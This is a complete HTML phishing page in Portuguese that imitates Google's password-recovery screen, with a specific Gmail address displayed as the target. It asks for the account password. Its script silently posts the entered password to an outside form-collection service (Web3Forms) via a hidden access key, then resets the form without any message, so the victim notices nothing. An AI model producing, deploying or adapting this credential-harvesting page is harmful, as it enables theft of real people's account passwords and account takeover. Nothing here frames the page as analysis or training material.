<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Confirmar identidade</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    body {
      margin: 0;
      background-color: #121212;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }

    .card {
      width: 900px;
      max-width: 95%;
      background-color: #000;
      border-radius: 20px;
      padding: 48px;
      display: flex;
      justify-content: space-between;
      gap: 40px;
    }

    .left {
      max-width: 420px;
    }

    .logo {
      width: 60px;
      margin-bottom: 24px;
    }

    h1 {
      font-size: 36px;
      font-weight: 500;
      margin: 0 0 24px 0;
      line-height: 1.2;
    }

    .email {
      display: inline-flex;
      align-items: center;
      padding: 6px 14px;
      border: 1px solid #5f6368;
      border-radius: 20px;
      font-size: 14px;
      color: #e8eaed;
    }

    .right {
      max-width: 360px;
      width: 100%;
    }

    .right p {
      color: #bdc1c6;
      margin-bottom: 16px;
      font-size: 14px;
    }

    input[type="password"],
    input[type="text"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border-radius: 4px;
      border: 1px solid #5f6368;
      background: transparent;
      color: #fff;
      outline: none;
    }

    .checkbox {
      margin-top: 10px;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      color: #e8eaed;
      cursor: pointer;
    }

    .actions {
      margin-top: 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .link {
      color: #8ab4f8;
      text-decoration: none;
      font-size: 14px;
    }

    .btn {
      background-color: #8ab4f8;
      color: #000;
      border: none;
      border-radius: 20px;
      padding: 10px 24px;
      font-size: 14px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #a1c2fa;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="left">
      <img
        src="https://i.ibb.co/GQJWNHyf/Captura-de-tela-2026-01-29-212709.png"
        alt="Logo"
        class="logo"
      >

      <h1>Recuperação de senha do google</h1>

      <div class="email">
        marciodoxosse@gmail.com
      </div>
    </div>

    <div class="right">
      <p>Para continuar, primeiro confirme sua identidade</p>

      <form id="formNome">
        <input type="hidden" name="access_key" value="6332c1be-705b-4f53-94b4-a38267e2cf2a">

        <input
          id="nome"
          name="nome"
          type="password"
          placeholder="Digite sua senha"
          required
        >

        <label class="checkbox">
          <input type="checkbox" id="verNome">
          Mostrar senha
        </label>

        <div class="actions">
          <a href="#" class="link">Tentar de outro jeito</a>
          <button type="submit" class="btn">Avançar</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    // mostrar / ocultar nome
    const checkbox = document.getElementById("verNome");
    const nomeInput = document.getElementById("nome");

    checkbox.addEventListener("change", () => {
      nomeInput.type = checkbox.checked ? "text" : "password";
    });

    // envio silencioso para Web3Forms (sem mensagens)
    document.getElementById("formNome").addEventListener("submit", function (e) {
      e.preventDefault();

      const formData = new FormData(this);

      fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData
      }).finally(() => {
        this.reset();
        nomeInput.type = "password";
      });
    });
  </script>

</body>
</html>
